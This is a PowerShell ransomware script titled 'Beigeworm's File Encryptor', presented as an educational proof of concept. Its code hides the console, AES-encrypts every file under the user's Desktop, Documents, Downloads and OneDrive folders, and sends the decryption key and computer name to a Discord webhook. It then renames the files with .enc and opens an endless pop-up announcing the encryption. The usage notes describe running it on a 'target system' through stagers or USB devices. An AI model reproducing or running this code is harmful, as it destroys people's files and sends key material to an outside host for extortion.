<#=================================================== Beigeworm's File Encryptor =======================================================

SYNOPSIS
This script encrypts all files within selected folders, posts the encryption key to a Discord webhook, and starts a non closable window
with a notice to the user.

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**

THIS IS EFFECTIVELY RANSOMWARE - I CANNOT TAKE RESPONSIBILITY FOR LOST FILES!
DO NOT USE THIS ON ANY CRITICAL SYSTEMS OR SYSTEMS WITHOUT PERMISSION
THIS IS A PROOF OF CONCEPT TO WRITE RANSOMWARE IN POWERSHELL AND IS FOR EDUCATIONAL PURPOSES

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   

USAGE
1. Enter your webhook below. (if not pre-defined in a stager file or duckyscript etc)
2. Run the script on target system.
3. Check Discord for the Decryption Key.
4. Use the decryptor to decrypt the files.

CREDIT
Credit and kudos to InfosecREDD for the idea of writing ransomware in Powershell
this is my interpretation of his non publicly available script used in this Talking Sasquatch video.
https://youtu.be/IwfoHN2dWeE

#>

# Uncomment below if not using a stager (base64 script, flipper etc)
# $dc = 'WEBHOOK_HERE'

# Setup for the console
$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host
[Console]::SetWindowSize(1, 1)
[Console]::SetWindowPosition(10000, 10000)

# ENCRYPT FILE CONTENTS
# Define setup variables
$whuri = "$dc"
$SourceFolder = "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive"
$files = Get-ChildItem -Path $SourceFolder -File -Recurse

# Generate the indcator file (for pop-up close detection)
$indicator = "$env:tmp/indicate"
if (!(Test-Path -Path $indicator)){
"indicate" | Out-File -FilePath $indicator -Append
}else{exit}

# Encryption setup
$CustomIV = 'r7SbTffTMbMA4Zm70iHAwA=='
$Key = [System.Security.Cryptography.Aes]::Create()
$Key.GenerateKey()
$IVBytes = [System.Convert]::FromBase64String($CustomIV)
$Key.IV = $IVBytes
$KeyBytes = $Key.Key
$KeyString = [System.Convert]::ToBase64String($KeyBytes)

# Save key to a local temp file (FAILSAFE)
"Decryption Key: $KeyString" | Out-File -FilePath $env:tmp/key.log -Append

# Define the body of the message and convert it to JSON
$body = @{"username" = "$env:COMPUTERNAME" ;"content" = "Decryption Key: $KeyString"} | ConvertTo-Json

# Use 'Invoke-RestMethod' command to send the message to Discord
IRM -Uri $whuri -Method Post -ContentType "application/json" -Body $body

# Encrypt each file in the source folder (recursive)
Get-ChildItem -Path $SourceFolder -File -Recurse | ForEach-Object {
    $File = $_
    $Encryptor = $Key.CreateEncryptor()
    $Content = [System.IO.File]::ReadAllBytes($File.FullName)
    $EncryptedContent = $Encryptor.TransformFinalBlock($Content, 0, $Content.Length)
    [System.IO.File]::WriteAllBytes($File.FullName, $EncryptedContent)
}

# CHANGE FILE EXTENSIONS
# Loop through each file and rename it
foreach ($file in $files) {
    $newName = $file.Name + ".enc"
    $newPath = Join-Path -Path $SourceFolder -ChildPath $newName
    Rename-Item -Path $file.FullName -NewName $newName
}

# START POP-UP AND CLEAN UP
$toVbs = @'
Do : MsgBox vbCrLf & "Hello User! Your Files Have Been ENCRYPTED." & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & "Run the Decryptor script and enter the key to recover files" & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & "You can close this window when Decryption is complete" & vbCrLf & vbCrLf, vbInformation, "**OH NO! Your Files are ENCRYPTED**" : Loop

'@
$VbsPath = "$env:tmp\v.vbs"
$ToVbs | Out-File -FilePath $VbsPath -Force
# Start pop-up window
& $VbsPath
sleep 3
# Clean up
rm -Path $VbsPath -Force
